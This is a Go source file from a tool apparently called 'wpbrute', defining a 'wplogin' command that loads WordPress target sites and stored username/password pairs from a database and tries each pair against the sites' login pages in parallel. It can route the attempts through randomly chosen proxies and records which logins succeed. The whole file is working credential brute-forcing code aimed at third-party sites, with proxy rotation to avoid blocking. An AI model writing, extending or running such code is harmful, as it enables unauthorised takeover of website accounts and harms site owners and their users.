package brute

import (
	"fmt"
	"net/url"
	"sync"
	"time"
	"wpbrute/cmd"
	"wpbrute/pkg/models"
	"wpbrute/pkg/wordpress"

	"github.com/gammazero/workerpool"
	cli "github.com/urfave/cli/v2"
)

var BruteWPLogin = &cli.Command{
	Name: "wplogin",
	Flags: []cli.Flag{
		&cli.Int64Flag{
			Name:    "number, n",
			Aliases: []string{"n"},
			Usage:   "the number of targets you'd like to test credentials for",
			Value:   1,
		},
		&cli.BoolFlag{
			Name:    "useproxy, p",
			Aliases: []string{"p"},
			Usage:   "whether or not you want to perform this task with proxies from the database",
			Value:   false,
		},
	},
	Action: func(c *cli.Context) error {
		var numSites int64
		if c.IsSet("number") {
			numSites = c.Int64("number")
		}

		var useProxies bool
		if c.IsSet("useproxy") {
			useProxies = c.Bool("useproxy")
		}

		fmt.Printf("Checking wp-login credentials for a maximum of %d sites - using proxies: %t\n", numSites, useProxies)

		// 1. fetch targets

		var targets []*models.Target
		err := cmd.DBConnection.Where("enabled = ? and wp_login_enabled = ?", true, true).Order("random()").Limit(int(numSites)).Find(&targets).Error
		if err != nil {
			return err
		}

		if len(targets) == 0 {
			fmt.Println("No targets meet the criteria for this check (is_https_check_time = null or is_https = null).")
			return nil
		}
		fmt.Printf("A total number of %d site(s) meet the criteria. Checking now...\n", len(targets))

		wp := workerpool.New(cmd.Config.WPBruteConfig.WorkerCount)

		// Iterate over targets
		targetCreds := make(map[*models.Target][]*models.WordpressCredential)
		var wg sync.WaitGroup
		for idx, target := range targets {
			fmt.Println(target.Domain)
			wg.Add(1)
			go func(tidx, tlen int, t *models.Target) {
				fmt.Printf("[%d/%d] Fetching creds from db for %s\n", tidx, tlen, t.Domain)

				var creds []*models.WordpressCredential
				err := cmd.DBConnection.Where("wp_login_success is null and target_id = ?", t.ID).Order("random()").Find(&creds).Error
				if err != nil {
					fmt.Println(err)
					return
				}
				fmt.Printf("[%d/%d] Got %d credentials for target: %s\n", tidx, tlen, len(creds), t.Domain)
				targetCreds[t] = append(targetCreds[t], creds...)
				wg.Done()
			}(idx, len(targets), target)
		}
		wg.Wait()

		for target, creds := range targetCreds {
			fmt.Println(target.Domain, len(creds))
			for _, c := range creds {
				t := target
				cc := c
				fmt.Printf("Submitted wplogin job for: %s\n", t.Domain)
				wp.Submit(func() {
					doCredLogin(t, cc, useProxies)
				})
			}
		}

		fmt.Println("Waiting on outer target loop now...")
		wp.StopWait()

		return nil
	},
}

func doCredLogin(t *models.Target, cred *models.WordpressCredential, useProxies bool) {
	proxyString := ""
	if useProxies {
		var proxy *models.Proxy
		err := cmd.DBConnection.Where("enabled = ?", true).Order("random()").Limit(1).Find(&proxy).Error
		if err != nil {
			fmt.Printf("Error fetching proxy from database - skipping for target %s. Error was: %s\n", t.Domain, err)
			return
		}

		purl := url.URL{
			Scheme: proxy.Protocol,
			Host:   fmt.Sprintf("%s:%d", proxy.Host, proxy.Port),
			User:   url.UserPassword(proxy.Username, proxy.Password),
		}
		proxyString = purl.String()
	}

	wp, err := wordpress.New(proxyString, nil)
	if err != nil {
		fmt.Printf("An error occurred while instantiating the Wordpress instance for target %s with a proxy of %s. Skipping now!\n", t.Domain, proxyString)
		return
	}
	fmt.Printf("Attempting to login to %s on domain %s now...\n", cred.Username, t.Domain)
	loggedIn, err := wp.WPLogin(t, cred)
	if err != nil {
		fmt.Printf("Error logging in to %s on %s with password %s: %s\n", t.Domain, cred.Username, cred.Password, err)
	}
	now := time.Now()
	cred.WPLoginSuccess = &loggedIn
	if loggedIn {
		fmt.Printf("%s login result on domain %s was: %t! 🍆\n", cred.Username, t.Domain, loggedIn)
		cred.WPLoginSuccessTime = &now
	} else {
		fmt.Printf("%s login result on domain %s was: %t! 😢 \n", cred.Username, t.Domain, loggedIn)
		cred.WPLoginFailTime = &now
	}

	err = cmd.DBConnection.Save(cred).Error
	if err != nil {
		fmt.Println("Error saving credential: ", err)
	}

}
